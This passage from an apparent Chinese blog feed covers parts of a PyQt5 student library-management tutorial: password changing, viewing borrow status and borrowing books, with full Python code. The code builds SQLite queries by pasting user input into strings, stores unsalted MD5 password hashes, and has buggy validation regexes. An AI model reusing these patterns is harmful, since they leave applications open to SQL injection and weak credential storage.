&#x3D; QLineEdit()</span><br><span class="line">        self.confirmPasswordEdit &#x3D; QLineEdit()</span><br><span class="line"></span><br><span class="line">        self.changePasswordButton &#x3D; QPushButton(&quot;确认修改&quot;)</span><br><span class="line">        self.changePasswordButton.setFixedWidth(140)</span><br><span class="line">        self.changePasswordButton.setFixedHeight(32)</span><br><span class="line"></span><br><span class="line">        self.layout.addRow(&quot;&quot;, self.titlelabel)</span><br><span class="line">        self.layout.addRow(self.studentIdLabel, self.studentIdEdit)</span><br><span class="line">        # self.layout.addRow(self.studentNameLabel,self.studentNameEdit)</span><br><span class="line">        self.layout.addRow(self.oldPasswordLabel, self.oldPasswordEdit)</span><br><span class="line">        self.layout.addRow(self.passwordLabel, self.passwordEdit)</span><br><span class="line">        self.layout.addRow(self.confirmPasswordLabel, self.confirmPasswordEdit)</span><br><span class="line">        self.layout.addRow(&quot;&quot;, self.changePasswordButton)</span><br><span class="line"></span><br><span class="line">        font &#x3D; QFont()</span><br><span class="line">        font.setPixelSize(20)</span><br><span class="line">        self.titlelabel.setFont(font)</span><br><span class="line">        font.setPixelSize(16)</span><br><span class="line">        self.studentIdLabel.setFont(font)</span><br><span class="line">        # self.studentNameLabel.setFont(font)</span><br><span class="line">        self.oldPasswordLabel.setFont(font)</span><br><span class="line">        self.passwordLabel.setFont(font)</span><br><span class="line">        self.confirmPasswordLabel.setFont(font)</span><br><span class="line"></span><br><span class="line">        font.setPixelSize(16)</span><br><span class="line">        self.studentIdEdit.setFont(font)</span><br><span class="line">        self.changePasswordButton.setFont(font)</span><br><span class="line">        # self.studentNameEdit.setFont(font)</span><br><span class="line">        font.setPixelSize(10)</span><br><span class="line">        self.oldPasswordEdit.setFont(font)</span><br><span class="line">        self.passwordEdit.setFont(font)</span><br><span class="line">        self.confirmPasswordEdit.setFont(font)</span><br><span class="line"></span><br><span class="line">        self.titlelabel.setMargin(8)</span><br><span class="line">        self.layout.setVerticalSpacing(10)</span><br><span class="line"></span><br><span class="line">        # 设置长度</span><br><span class="line">        self.studentIdEdit.setMaxLength(10)</span><br><span class="line">        self.oldPasswordEdit.setMaxLength(16)</span><br><span class="line">        self.passwordEdit.setMaxLength(16)</span><br><span class="line">        self.confirmPasswordEdit.setMaxLength(16)</span><br><span class="line">        # 设置密码掩膜</span><br><span class="line">        self.oldPasswordEdit.setEchoMode(QLineEdit.Password)</span><br><span class="line">        self.passwordEdit.setEchoMode(QLineEdit.Password)</span><br><span class="line">        self.confirmPasswordEdit.setEchoMode(QLineEdit.Password)</span><br><span class="line"></span><br><span class="line">        # 设置校验</span><br><span class="line">        reg &#x3D; QRegExp(&quot;PB[0~9]&#123;8&#125;&quot;)</span><br><span class="line">        pValidator &#x3D; QRegExpValidator(self)</span><br><span class="line">        pValidator.setRegExp(reg)</span><br><span class="line">        self.studentIdEdit.setValidator(pValidator)</span><br><span class="line"></span><br><span class="line">        reg &#x3D; QRegExp(&quot;[a-zA-z0-9]+$&quot;)</span><br><span class="line">        pValidator.setRegExp(reg)</span><br><span class="line">        self.oldPasswordEdit.setValidator(pValidator)</span><br><span class="line">        self.passwordEdit.setValidator(pValidator)</span><br><span class="line">        self.confirmPasswordEdit.setValidator(pValidator)</span><br><span class="line"></span><br><span class="line">        # 设置信号与槽</span><br><span class="line">        self.changePasswordButton.clicked.connect(self.changePasswordButtonClicked)</span><br><span class="line"></span><br><span class="line">    def changePasswordButtonClicked(self):</span><br><span class="line">        studentId &#x3D; self.studentIdEdit.text()</span><br><span class="line">        oldPassword &#x3D; self.oldPasswordEdit.text()</span><br><span class="line">        password &#x3D; self.passwordEdit.text()</span><br><span class="line">        confirmPassword &#x3D; self.confirmPasswordEdit.text()</span><br><span class="line">        if (studentId &#x3D;&#x3D; &quot;&quot; or oldPassword &#x3D;&#x3D; &quot;&quot; or password &#x3D;&#x3D; &quot;&quot; or confirmPassword &#x3D;&#x3D; &quot;&quot;):</span><br><span class="line">            print(QMessageBox.warning(self, &quot;警告&quot;, &quot;输入不可为空，请重新输入&quot;, QMessageBox.Yes, QMessageBox.Yes))</span><br><span class="line">            return</span><br><span class="line">        db &#x3D; QSqlDatabase.addDatabase(&quot;QSQLITE&quot;)</span><br><span class="line">        db.setDatabaseName(&#39;.&#x2F;db&#x2F;LibraryManagement.db&#39;)</span><br><span class="line">        db.open()</span><br><span class="line">        query &#x3D; QSqlQuery()</span><br><span class="line">        sql &#x3D; &quot;SELECT * FROM User WHERE StudentId&#x3D;&#39;%s&#39;&quot; % studentId</span><br><span class="line">        query.exec_(sql)</span><br><span class="line">        # 如果用户不存在</span><br><span class="line">        if (not query.next()):</span><br><span class="line">            print(QMessageBox.warning(self, &quot;警告&quot;, &quot;该用户不存在，请重新输入&quot;, QMessageBox.Yes, QMessageBox.Yes))</span><br><span class="line">            self.studentIdEdit.clear()</span><br><span class="line">            return</span><br><span class="line">            # 如果密码错误</span><br><span class="line">        hl &#x3D; hashlib.md5()</span><br><span class="line">        hl.update(oldPassword.encode(encoding&#x3D;&#39;utf-8&#39;))</span><br><span class="line">        md5password &#x3D; hl.hexdigest()</span><br><span class="line">        sql &#x3D; &quot;SELECT * FROM User WHERE Password&#x3D;&#39;%s&#39; AND StudentId&#x3D;&#39;%s&#39;&quot; %(md5password,studentId)</span><br><span class="line">        query.exec_(sql)</span><br><span class="line">        if (not query.next()):</span><br><span class="line">            print(QMessageBox.warning(self, &quot;警告&quot;, &quot;原密码输入错误,请重新输入&quot;, QMessageBox.Yes, QMessageBox.Yes))</span><br><span class="line">            self.oldPasswordEdit.clear()</span><br><span class="line">            return</span><br><span class="line">        # 密码与确认密码不同</span><br><span class="line">        if(password!&#x3D;confirmPassword):</span><br><span class="line">            print(QMessageBox.warning(self,&quot;警告&quot;,&quot;两次输入密码不同,请确认输入&quot;,QMessageBox.Yes,QMessageBox.Yes))</span><br><span class="line">            self.passwordEdit.clear()</span><br><span class="line">            self.confirmPasswordEdit.clear()</span><br><span class="line">            return</span><br><span class="line">        # 修改密码</span><br><span class="line">        hl &#x3D; hashlib.md5()</span><br><span class="line">        hl.update(password.encode(encoding&#x3D;&#39;utf-8&#39;))</span><br><span class="line">        md5password &#x3D; hl.hexdigest()</span><br><span class="line">        sql&#x3D;&quot;UPDATE User SET Password&#x3D;&#39;%s&#39; WHERE StudentId&#x3D;&#39;%s&#39;&quot;%(md5password,studentId)</span><br><span class="line">        query.exec_(sql)</span><br><span class="line">        db.commit()</span><br><span class="line">        QMessageBox.information(self,&quot;提醒&quot;,&quot;修改密码成功，请登录系统!&quot;,QMessageBox.Yes,QMessageBox.Yes)</span><br><span class="line">        self.close()</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    app &#x3D; QApplication(sys.argv)</span><br><span class="line">    app.setWindowIcon(QIcon(&quot;.&#x2F;images&#x2F;MainWindow_1.png&quot;))</span><br><span class="line">    app.setStyleSheet(qdarkstyle.load_stylesheet_pyqt5())</span><br><span class="line">    mainMindow &#x3D; changePasswordDialog()</span><br><span class="line">    mainMindow.show()</span><br><span class="line">    sys.exit(app.exec_())</span><br></pre></td></tr></table></figure><h3><span id="pshi-xian-xiao-guo">实现效果</span><a href="#pshi-xian-xiao-guo" class="header-anchor">#</a></h3><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-135808.jpg" alt="这里写图片描述"><br><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-135813.jpg" alt="这里写图片描述"></p><h2><span id="pzui-hou-fu-shang-lian-jie">最后附上链接</span><a href="#pzui-hou-fu-shang-lian-jie" class="header-anchor">#</a></h2><p>项目地址：<a href="https://github.com/ycdxsb/LibraryManageDesktopApp" target="_blank" rel="noopener">github仓库链接</a></p>]]></content>
      <categories>
        <category>PyQt5</category>
        <category>图书馆管理系统</category>
      </categories>
      <tags>
        <tag>PyQt5</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>PyQt5搭建图书馆管理系统（9）——借阅状态查询</title>
    <url>/5ec72e4f.html</url>
    <content><![CDATA[<h2><span id="pfen-xi">分析</span><a href="#pfen-xi" class="header-anchor">#</a></h2><p>这个可以说是实现的最简单的一个功能了，只需要结合一下<code>QTableView</code>和<code>QSqlQueryModel</code>对<code>User_Book</code>表和<code>Book</code>表做一个联查即可，直接贴上代码如下</p><a id="more"></a><h2><span id="pdai-ma">代码</span><a href="#pdai-ma" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import sys</span><br><span class="line">from PyQt5.QtWidgets import *</span><br><span class="line">from PyQt5.QtGui import *</span><br><span class="line">from PyQt5.QtCore import Qt</span><br><span class="line">import qdarkstyle</span><br><span class="line">from PyQt5.QtSql import *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class BorrowStatusViewer(QWidget):</span><br><span class="line">    def __init__(self, studentId):</span><br><span class="line">        super(BorrowStatusViewer, self).__init__()</span><br><span class="line">        self.resize(700, 500)</span><br><span class="line">        self.studentId &#x3D; studentId</span><br><span class="line">        self.setWindowTitle(&quot;欢迎使用图书馆管理系统&quot;)</span><br><span class="line">        self.setUpUI()</span><br><span class="line"></span><br><span class="line">    def setUpUI(self):</span><br><span class="line">        self.db &#x3D; QSqlDatabase.addDatabase(&quot;QSQLITE&quot;)</span><br><span class="line">        self.db.setDatabaseName(&#39;.&#x2F;db&#x2F;LibraryManagement.db&#39;)</span><br><span class="line">        self.db.open()</span><br><span class="line">        # 分为两块，上方是已借未归还书，下方是已归还书</span><br><span class="line">        self.layout &#x3D; QVBoxLayout(self)</span><br><span class="line">        # Label设置</span><br><span class="line">        self.borrowedLabel &#x3D; QLabel(&quot;未归还:&quot;)</span><br><span class="line">        self.returnedLabel &#x3D; QLabel(&quot;已归还:&quot;)</span><br><span class="line">        self.borrowedLabel.setFixedHeight(32)</span><br><span class="line">        self.borrowedLabel.setFixedWidth(60)</span><br><span class="line">        self.returnedLabel.setFixedHeight(32)</span><br><span class="line">        self.returnedLabel.setFixedWidth(60)</span><br><span class="line">        font &#x3D; QFont()</span><br><span class="line">        font.setPixelSize(18)</span><br><span class="line">        self.borrowedLabel.setFont(font)</span><br><span class="line">        self.returnedLabel.setFont(font)</span><br><span class="line"></span><br><span class="line">        # Table和Model</span><br><span class="line">        self.borrowedTableView &#x3D; QTableView()</span><br><span class="line">        self.borrowedTableView.horizontalHeader().setStretchLastSection(True)</span><br><span class="line">        self.borrowedTableView.horizontalHeader().setSectionResizeMode(QHeaderView.Stretch)</span><br><span class="line">        self.borrowedTableView.setEditTriggers(QAbstractItemView.NoEditTriggers)</span><br><span class="line">        self.returnedTableView &#x3D; QTableView()</span><br><span class="line">        self.returnedTableView.horizontalHeader().setStretchLastSection(True)</span><br><span class="line">        self.returnedTableView.horizontalHeader().setSectionResizeMode(QHeaderView.Stretch)</span><br><span class="line">        self.returnedTableView.setEditTriggers(QAbstractItemView.NoEditTriggers)</span><br><span class="line"></span><br><span class="line">        self.borrowedQueryModel &#x3D; QSqlQueryModel()</span><br><span class="line">        self.returnedQueryModel &#x3D; QSqlQueryModel()</span><br><span class="line">        self.borrowedTableView.setModel(self.borrowedQueryModel)</span><br><span class="line">        self.returnedTableView.setModel(self.returnedQueryModel)</span><br><span class="line">        self.borrowedQuery()</span><br><span class="line">        self.borrowedQueryModel.setHeaderData(0, Qt.Horizontal, &quot;书名&quot;)</span><br><span class="line">        self.borrowedQueryModel.setHeaderData(1, Qt.Horizontal, &quot;书号&quot;)</span><br><span class="line">        self.borrowedQueryModel.setHeaderData(2, Qt.Horizontal, &quot;作者&quot;)</span><br><span class="line">        self.borrowedQueryModel.setHeaderData(3, Qt.Horizontal, &quot;分类&quot;)</span><br><span class="line">        self.borrowedQueryModel.setHeaderData(4, Qt.Horizontal, &quot;出版社&quot;)</span><br><span class="line">        self.borrowedQueryModel.setHeaderData(5, Qt.Horizontal, &quot;出版时间&quot;)</span><br><span class="line">        self.borrowedQueryModel.setHeaderData(6, Qt.Horizontal, &quot;借出时间&quot;)</span><br><span class="line"></span><br><span class="line">        self.returnedQuery()</span><br><span class="line">        self.returnedQueryModel.setHeaderData(0, Qt.Horizontal, &quot;书名&quot;)</span><br><span class="line">        self.returnedQueryModel.setHeaderData(1, Qt.Horizontal, &quot;书号&quot;)</span><br><span class="line">        self.returnedQueryModel.setHeaderData(2, Qt.Horizontal, &quot;作者&quot;)</span><br><span class="line">        self.returnedQueryModel.setHeaderData(3, Qt.Horizontal, &quot;分类&quot;)</span><br><span class="line">        self.returnedQueryModel.setHeaderData(4, Qt.Horizontal, &quot;出版社&quot;)</span><br><span class="line">        self.returnedQueryModel.setHeaderData(5, Qt.Horizontal, &quot;出版时间&quot;)</span><br><span class="line">        self.returnedQueryModel.setHeaderData(6, Qt.Horizontal, &quot;借阅时间&quot;)</span><br><span class="line">        self.returnedQueryModel.setHeaderData(7, Qt.Horizontal, &quot;归还时间&quot;)</span><br><span class="line"></span><br><span class="line">        self.layout.addWidget(self.borrowedLabel)</span><br><span class="line">        self.layout.addWidget(self.borrowedTableView)</span><br><span class="line">        self.layout.addWidget(self.returnedLabel)</span><br><span class="line">        self.layout.addWidget(self.returnedTableView)</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line">    def borrowedQuery(self):</span><br><span class="line">        sql &#x3D; &quot;SELECT Book.BookName,Book.BookId,Auth,Category,Publisher,PublishTime,BorrowTime  FROM Book,User_Book WHERE Book.BookId&#x3D;User_Book.BookId AND User_Book.BorrowState&#x3D;1 AND StudentId&#x3D;&#39;%s&#39;&quot; % self.studentId</span><br><span class="line">        self.borrowedQueryModel.setQuery(sql)</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line">    def returnedQuery(self):</span><br><span class="line">        sql &#x3D; &quot;SELECT Book.BookName,Book.BookId,Auth,Category,Publisher,PublishTime,BorrowTime,ReturnTime  FROM Book,User_Book WHERE Book.BookId&#x3D;User_Book.BookId AND User_Book.BorrowState&#x3D;0 AND StudentId&#x3D;&#39;%s&#39;&quot; % self.studentId</span><br><span class="line">        self.returnedQueryModel.setQuery(sql)</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    app &#x3D; QApplication(sys.argv)</span><br><span class="line">    app.setWindowIcon(QIcon(&quot;.&#x2F;images&#x2F;MainWindow_1.png&quot;))</span><br><span class="line">    app.setStyleSheet(qdarkstyle.load_stylesheet_pyqt5())</span><br><span class="line">    mainMindow &#x3D; BorrowStatusViewer(&quot;PB15000135&quot;)</span><br><span class="line">    mainMindow.show()</span><br><span class="line">    sys.exit(app.exec_())</span><br></pre></td></tr></table></figure><h2><span id="pshi-xian-xiao-guo">实现效果</span><a href="#pshi-xian-xiao-guo" class="header-anchor">#</a></h2><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-135736.jpg" alt="Alt text"></p><h2><span id="pzui-hou-fu-shang-lian-jie">最后附上链接</span><a href="#pzui-hou-fu-shang-lian-jie" class="header-anchor">#</a></h2><p>项目地址：<a href="https://github.com/ycdxsb/LibraryManageDesktopApp" target="_blank" rel="noopener">github仓库链接</a></p>]]></content>
      <categories>
        <category>PyQt5</category>
        <category>图书馆管理系统</category>
      </categories>
      <tags>
        <tag>PyQt5</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>PyQt5搭建图书馆管理系统（8）——借书/还书功能</title>
    <url>/8effeb9b.html</url>
    <content><![CDATA[<h2><span id="pjie-shu-gong-neng-shi-xian">借书功能实现</span><a href="#pjie-shu-gong-neng-shi-xian" class="header-anchor">#</a></h2><h3><span id="pfen-xi">分析</span><a href="#pfen-xi" class="header-anchor">#</a></h3><p>本来借书的信息都是应该有RFID识别得到的，但是作为大作业，只能让用户输入信息了，但是书名之类的都不唯一，所以采取了与淘汰书籍一样的操作——让用户输入书号，自动匹配书本信息，然后确认借阅</p><p>借阅时，需要处理的逻辑如下：</p><ul><li>用户输入的书号存在，就匹配信息给用户</li><li>不存在就点击借阅，给出警告</li><li>借阅书籍数已经达到上限5本 ，给出警告</li><li>不允许借阅同样的书</li><li>更新<code>Book</code>表信息的借阅次数，剩余可借阅书数</li><li>在<code>User_Book</code>表插入记录</li><li>借阅成功给出提示</li></ul><a id="more"></a><h3><span id="pdai-ma-shi-xian">代码实现</span><a href="#pdai-ma-shi-xian" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import sys</span><br><span class="line">from PyQt5.QtWidgets import *</span><br><span class="line">from PyQt5.QtGui import *</span><br><span class="line">from PyQt5.QtCore import *</span><br><span class="line">import qdarkstyle</span><br><span class="line">import time</span><br><span class="line">from PyQt5.QtSql import *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class borrowBookDialog(QDialog):</span><br><span class="line">    borrow_book_success_signal &#x3D; pyqtSignal()</span><br><span class="line"></span><br><span class="line">    def __init__(self, StudentId, parent&#x3D;None):</span><br><span class="line">        super(borrowBookDialog, self).__init__(parent)</span><br><span class="line">        self.studentId &#x3D; StudentId</span><br><span class="line">        self.setUpUI()</span><br><span class="line">        self.setWindowModality(Qt.WindowModal)</span><br><span class="line">        self.setWindowTitle(&quot;借阅书籍&quot;)</span><br><span class="line"></span><br><span class="line">    def setUpUI(self):</span><br><span class="line">        # 书名，书号，作者，分类，添加数量.出版社,出版日期</span><br><span class="line">        # 书籍分类：哲学类、社会科学类、政治类、法律类、军事类、经济类、文化类、教育类、体育类、语言文字类、艺术类、历史类、地理类、天文学类、生物学类、医学卫生类、农业类</span><br><span class="line">        BookCategory &#x3D; [&quot;哲学&quot;, &quot;社会科学&quot;, &quot;政治&quot;, &quot;法律&quot;, &quot;军事&quot;, &quot;经济&quot;, &quot;文化&quot;, &quot;教育&quot;, &quot;体育&quot;, &quot;语言文字&quot;, &quot;艺术&quot;, &quot;历史&quot;</span><br><span class="line">            , &quot;地理&quot;, &quot;天文学&quot;, &quot;生物学&quot;, &quot;医学卫生&quot;, &quot;农业&quot;]</span><br><span class="line">        self.resize(300, 400)</span><br><span class="line">        self.layout &#x3D; QFormLayout()</span><br><span class="line">        self.setLayout(self.layout)</span><br><span class="line"></span><br><span class="line">        # Label控件</span><br><span class="line">        self.borrowStudentLabel &#x3D; QLabel(&quot;借 阅 人:&quot;)</span><br><span class="line">        self.borrowStudentIdLabel &#x3D; QLabel(self.studentId)</span><br><span class="line">        self.titlelabel &#x3D; QLabel(&quot;  借阅书籍&quot;)</span><br><span class="line">        self.bookNameLabel &#x3D; QLabel(&quot;书    名:&quot;)</span><br><span class="line">        self.bookIdLabel &#x3D; QLabel(&quot;书    号:&quot;)</span><br><span class="line">        self.authNameLabel &#x3D; QLabel(&quot;作    者:&quot;)</span><br><span class="line">        self.categoryLabel &#x3D; QLabel(&quot;分    类:&quot;)</span><br><span class="line">        self.publisherLabel &#x3D; QLabel(&quot;出 版 社:&quot;)</span><br><span class="line">        self.publishDateLabel &#x3D; QLabel(&quot;出版日期:&quot;)</span><br><span class="line"></span><br><span class="line">        # button控件</span><br><span class="line">        self.borrowBookButton &#x3D; QPushButton(&quot;确认借阅&quot;)</span><br><span class="line"></span><br><span class="line">        # lineEdit控件</span><br><span class="line">        self.bookNameEdit &#x3D; QLineEdit()</span><br><span class="line">        self.bookIdEdit &#x3D; QLineEdit()</span><br><span class="line">        self.authNameEdit &#x3D; QLineEdit()</span><br><span class="line">        self.categoryComboBox &#x3D; QComboBox()</span><br><span class="line">        self.categoryComboBox.addItems(BookCategory)</span><br><span class="line">        self.publisherEdit &#x3D; QLineEdit()</span><br><span class="line">        self.publishTime &#x3D; QLineEdit()</span><br><span class="line"></span><br><span class="line">        self.bookNameEdit.setMaxLength(10)</span><br><span class="line">        self.bookIdEdit.setMaxLength(6)</span><br><span class="line">        self.authNameEdit.setMaxLength(10)</span><br><span class="line">        self.publisherEdit.setMaxLength(10)</span><br><span class="line"></span><br><span class="line">        # 添加进formlayout</span><br><span class="line">        self.layout.addRow(&quot;&quot;, self.titlelabel)</span><br><span class="line">        self.layout.addRow(self.borrowStudentLabel, self.borrowStudentIdLabel)</span><br><span class="line">        self.layout.addRow(self.bookNameLabel, self.bookNameEdit)</span><br><span class="line">        self.layout.addRow(self.bookIdLabel, self.bookIdEdit)</span><br><span class="line">        self.layout.addRow(self.authNameLabel, self.authNameEdit)</span><br><span class="line">        self.layout.addRow(self.categoryLabel, self.categoryComboBox)</span><br><span class="line">        self.layout.addRow(self.publisherLabel, self.publisherEdit)</span><br><span class="line">        self.layout.addRow(self.publishDateLabel, self.publishTime)</span><br><span class="line">        self.layout.addRow(&quot;&quot;, self.borrowBookButton)</span><br><span class="line"></span><br><span class="line">        # 设置字体</span><br><span class="line">        font &#x3D; QFont()</span><br><span class="line">        font.setPixelSize(20)</span><br><span class="line">        self.titlelabel.setFont(font)</span><br><span class="line">        font.setPixelSize(16)</span><br><span class="line">        self.borrowStudentIdLabel.setFont(font)</span><br><span class="line">        font.setPixelSize(14)</span><br><span class="line">        self.borrowStudentLabel.setFont(font)</span><br><span class="line">        self.bookNameLabel.setFont(font)</span><br><span class="line">        self.bookIdLabel.setFont(font)</span><br><span class="line">        self.authNameLabel.setFont(font)</span><br><span class="line">        self.categoryLabel.setFont(font)</span><br><span class="line">        self.publisherLabel.setFont(font)</span><br><span class="line">        self.publishDateLabel.setFont(font)</span><br><span class="line"></span><br><span class="line">        self.bookNameEdit.setFont(font)</span><br><span class="line">        self.bookNameEdit.setReadOnly(True)</span><br><span class="line">        self.bookNameEdit.setStyleSheet(&quot;background-color:#363636&quot;)</span><br><span class="line">        self.bookIdEdit.setFont(font)</span><br><span class="line">        self.authNameEdit.setFont(font)</span><br><span class="line">        self.authNameEdit.setReadOnly(True)</span><br><span class="line">        self.authNameEdit.setStyleSheet(&quot;background-color:#363636&quot;)</span><br><span class="line">        self.publisherEdit.setFont(font)</span><br><span class="line">        self.publisherEdit.setReadOnly(True)</span><br><span class="line">        self.publisherEdit.setStyleSheet(&quot;background-color:#363636&quot;)</span><br><span class="line">        self.publishTime.setFont(font)</span><br><span class="line">        self.publishTime.setStyleSheet(&quot;background-color:#363636&quot;)</span><br><span class="line">        self.categoryComboBox.setFont(font)</span><br><span class="line">        self.categoryComboBox.setStyleSheet(&quot;background-color:#363636&quot;)</span><br><span class="line"></span><br><span class="line">        # button设置</span><br><span class="line">        font.setPixelSize(16)</span><br><span class="line">        self.borrowBookButton.setFont(font)</span><br><span class="line">        self.borrowBookButton.setFixedHeight(32)</span><br><span class="line">        self.borrowBookButton.setFixedWidth(140)</span><br><span class="line"></span><br><span class="line">        # 设置间距</span><br><span class="line">        self.titlelabel.setMargin(8)</span><br><span class="line">        self.layout.setVerticalSpacing(10)</span><br><span class="line">        self.borrowBookButton.clicked.connect(self.borrowButtonClicked)</span><br><span class="line">        self.bookIdEdit.textChanged.connect(self.bookIdEditChanged)</span><br><span class="line">        self.bookIdEdit.returnPressed.connect(self.borrowButtonClicked)</span><br><span class="line"></span><br><span class="line">    def borrowButtonClicked(self):</span><br><span class="line">        # 获取书号，书号为空或不存在库中，则弹出错误</span><br><span class="line">        # 向Book_User表插入记录，更新User表以及Book表</span><br><span class="line">        BookId &#x3D; self.bookIdEdit.text()</span><br><span class="line">        # BookId为空的处理</span><br><span class="line">        if (BookId &#x3D;&#x3D; &quot;&quot;):</span><br><span class="line">            print(QMessageBox.warning(self, &quot;警告&quot;, &quot;你所要借的书不存在，请查看输入&quot;, QMessageBox.Yes, QMessageBox.Yes))</span><br><span class="line">            return</span><br><span class="line">        # 打开数据库</span><br><span class="line">        db &#x3D; db &#x3D; QSqlDatabase.addDatabase(&quot;QSQLITE&quot;)</span><br><span class="line">        db.setDatabaseName(&#39;.&#x2F;db&#x2F;LibraryManagement.db&#39;)</span><br><span class="line">        db.open()</span><br><span class="line">        query &#x3D; QSqlQuery()</span><br><span class="line">        # 如果BookId不存在</span><br><span class="line">        sql &#x3D; &quot;SELECT * FROM Book WHERE BookId&#x3D;&#39;%s&#39;&quot; % BookId</span><br><span class="line">        query.exec_(sql)</span><br><span class="line">        if (not query.next()):</span><br><span class="line">            print(QMessageBox.warning(self, &quot;警告&quot;, &quot;你所要借的书不存在，请查看输入&quot;, QMessageBox.Yes, QMessageBox.Yes))</span><br><span class="line">            return</span><br><span class="line"></span><br><span class="line">        # 借书上限5本</span><br><span class="line">        sql &#x3D; &quot;SELECT COUNT(StudentId) FROM User_Book WHERE StudentId&#x3D;&#39;%s&#39; AND BorrowState&#x3D;1&quot; % (</span><br><span class="line">            self.studentId)</span><br><span class="line">        query.exec_(sql)</span><br><span class="line">        if (query.next()):</span><br><span class="line">            borrowNum &#x3D; query.value(0)</span><br><span class="line">            if (borrowNum &#x3D;&#x3D; 5):</span><br><span class="line">                QMessageBox.warning(self, &quot;警告&quot;, &quot;您借阅的书达到上限（5本）,借书失败！&quot;, QMessageBox.Yes, QMessageBox.Yes)</span><br><span class="line">                return</span><br><span class="line">        # 不允许重复借书</span><br><span class="line">        sql &#x3D; &quot;SELECT COUNT(StudentId) FROM User_Book WHERE  StudentId&#x3D;&#39;%s&#39; AND BookId&#x3D;&#39;%s&#39; AND BorrowState&#x3D;1&quot; % (</span><br><span class="line">        self.studentId, BookId)</span><br><span class="line">        query.exec_(sql)</span><br><span class="line">        if (query.next() and query.value(0)):</span><br><span class="line">            QMessageBox.warning(self, &quot;警告&quot;, &quot;您已经借阅了本书并尚未归还，借阅失败！&quot;, QMessageBox.Yes, QMessageBox.Yes)</span><br><span class="line">            return</span><br><span class="line">        # 更新User表</span><br><span class="line">        sql &#x3D; &quot;UPDATE User SET TimesBorrowed&#x3D;TimesBorrowed+1,NumBorrowed&#x3D;NumBorrowed+1 WHERE StudentId&#x3D;&#39;%s&#39;&quot; % self.studentId</span><br><span class="line">        query.exec_(sql)</span><br><span class="line">        db.commit()</span><br><span class="line">        # 更新Book表</span><br><span class="line">        sql &#x3D; &quot;UPDATE Book SET NumCanBorrow&#x3D;NumCanBorrow-1,NumBorrowed&#x3D;NumBorrowed+1 WHERE BookId&#x3D;&#39;%s&#39;&quot; % BookId</span><br><span class="line">        query.exec_(sql)</span><br><span class="line">        db.commit()</span><br><span class="line">        # 插入User_Book表</span><br><span class="line">        timenow &#x3D; time.strftime(&#39;%Y-%m-%d&#39;, time.localtime(time.time()))</span><br><span class="line">        sql &#x3D; &quot;INSERT INTO User_Book VALUES (&#39;%s&#39;,&#39;%s&#39;,&#39;%s&#39;,NULL,1)&quot; % (self.studentId, BookId, timenow)</span><br><span class="line">        print(sql)</span><br><span class="line">        query.exec_(sql)</span><br><span class="line">        db.commit()</span><br><span class="line">        print(QMessageBox.information(self, &quot;提示&quot;, &quot;借阅成功!&quot;, QMessageBox.Yes, QMessageBox.Yes))</span><br><span class="line">        self.borrow_book_success_signal.emit()</span><br><span class="line">        self.close()</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line">    def bookIdEditChanged(self):</span><br><span class="line">        bookId &#x3D; self.bookIdEdit.text()</span><br><span class="line">        if (bookId &#x3D;&#x3D; &quot;&quot;):</span><br><span class="line">            self.bookNameEdit.clear()</span><br><span class="line">            self.publisherEdit.clear()</span><br><span class="line">            self.authNameEdit.clear()</span><br><span class="line">            self.publishTime.clear()</span><br><span class="line">        db &#x3D; QSqlDatabase.addDatabase(&quot;QSQLITE&quot;)</span><br><span class="line">        db.setDatabaseName(&#39;.&#x2F;db&#x2F;LibraryManagement.db&#39;)</span><br><span class="line">        db.open()</span><br><span class="line">        query &#x3D; QSqlQuery()</span><br><span class="line">        sql &#x3D; &quot;SELECT * FROM Book WHERE BookId&#x3D;&#39;%s&#39;&quot; % (bookId)</span><br><span class="line">        query.exec_(sql)</span><br><span class="line">        # 查询对应书号，如果存在就更新form</span><br><span class="line">        if (query.next()):</span><br><span class="line">            self.bookNameEdit.setText(query.value(0))</span><br><span class="line">            self.authNameEdit.setText(query.value(2))</span><br><span class="line">            self.categoryComboBox.setCurrentText(query.value(3))</span><br><span class="line">            self.publisherEdit.setText(query.value(4))</span><br><span class="line">            self.publishTime.setText(query.value(5))</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    app &#x3D; QApplication(sys.argv)</span><br><span class="line">    app.setWindowIcon(QIcon(&quot;.&#x2F;images&#x2F;MainWindow_1.png&quot;))</span><br><span class="line">    app.setStyleSheet(qdarkstyle.load_stylesheet_pyqt5())</span><br><span class="line">    mainMindow &#x3D; borrowBookDialog(&quot;PB15000135&quot;)</span><br><span class="line">    mainMindow.show()</span><br><span class="line">    sys.exit(app.exec_())</span><br></pre></td></tr></table></figure><h3><span id="pshi-xian-xiao-guo">实现效果</span><a href="#pshi-xian-xiao-guo" class="header-anchor">#</a></h3><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-135655.jpg" alt="这里写图片描述"><br><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-135700.jpg" alt="这里写图片描述"><br><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-135706.jpg" alt="这里写图片描述"></p><h2><span id="pgui-huan-shu-ji-gong-neng-shi-xian">归还书籍功能实现</span><a href="#pgui-huan-shu-ji-gong-neng-shi-xian" class="header-anchor">#</a></h2><h3><span id="pfen-xi">分析</span><a href="#pfen-xi" 